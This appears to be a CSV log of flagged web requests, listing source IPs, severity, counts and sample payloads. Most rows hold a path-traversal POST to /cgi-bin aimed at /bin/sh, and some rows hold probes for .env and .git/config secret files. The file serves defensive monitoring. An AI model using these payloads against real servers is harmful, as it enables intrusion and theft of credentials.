IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
123.58.220.64,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
130.61.28.82,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
141.8.199.216,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
144.31.249.53,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
152.32.205.238,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
152.42.206.46,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
157.173.199.44,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
158.179.190.201,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
160.191.243.61,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
165.154.227.13,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
171.241.40.45,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
173.239.240.74,HIGH,3,"GET /.env HTTP/1.1"
173.239.240.76,HIGH,3,"GET /cp/.env HTTP/1.1"
173.239.240.79,HIGH,3,"GET /docker/.env HTTP/1.1"
175.200.104.40,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
177.70.2.220,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
181.176.14.90,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.118.143.154,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.128.139.52,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
185.141.107.177,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
190.124.153.17,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
192.250.228.42,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
198.46.146.200,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
206.183.129.205,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
207.244.238.54,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
212.64.216.215,HIGH,3,"GET /.env HTTP/1.1"
23.95.62.123,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
34.60.107.64,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
43.134.78.153,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
43.225.189.143,HIGH,3,"GET /.env HTTP/1.1"
45.78.235.71,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.85.146.175,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.113.149.86,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.253.183.81,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
47.90.209.221,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
49.233.13.171,HIGH,3,"GET /.git/config HTTP/1.1"
5.182.46.67,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
5.223.59.192,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
80.71.149.102,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
85.198.82.246,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
94.183.172.143,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
94.183.172.149,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
114.220.75.156,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
45.151.62.32,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.110.121.87,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
78.153.140.151,HIGH,3,"GET /.env HTTP/1.1"
78.153.140.156,HIGH,3,"GET /.env HTTP/1.1"
101.198.0.152,HIGH,2,"\x16\x03\x01\x015\x01\x00\x011\x03\x03&\x97d\xDA\xD5ghGq\xB5>\xB9|\xC9\xAC\xD2\xAC\xF2\x91\x11\x1C>\"
104.248.133.132,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x031&\xB83\xF6b\x03T&\x02\xA3d\xE0\xDC\xAE~\x91\xF2J\x7F\xC2\xBB\"
139.59.230.234,HIGH,2,"GET /.env HTTP/1.1"
142.93.105.7,HIGH,2,"GET /.env HTTP/1.1"
142.93.146.232,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCD\xDC\xDD\x9E\xCD\xD3<\xF8\xC9\xBF}\xB0\xE3l!\x90S\x8BP\xCF"
142.93.93.42,HIGH,2,"GET /.env HTTP/1.1"
143.244.177.0,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x97\xBE"
146.190.154.118,HIGH,2,"GET /.env HTTP/1.1"
147.185.132.100,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03G\xEE\xED\x84}\x8E\xA2\x95\x1D1\x85\xB2\xE0\xDE\xB3$w"
